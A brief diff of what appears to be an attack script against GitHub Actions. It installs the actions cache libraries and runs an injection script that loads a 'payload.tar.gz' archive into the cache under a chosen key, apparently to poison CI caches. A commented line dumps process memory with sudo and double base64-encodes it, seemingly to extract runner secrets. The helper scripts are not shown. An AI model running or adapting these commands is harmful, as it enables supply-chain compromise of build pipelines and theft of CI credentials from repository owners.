@@ -18,7 +18,7 @@
 #node inj.js ./arc2.tar.gz arc4
 
 npm install @actions/cache@4 @actions/core
-node inj2.mjs
-#node inj.js ./payload.tar.gz release-cache-v1
+#node inj2.mjs
+node inj.js ./payload.tar.gz tmpkey2
 
 #sudo python3 mem.py | base64 | base64
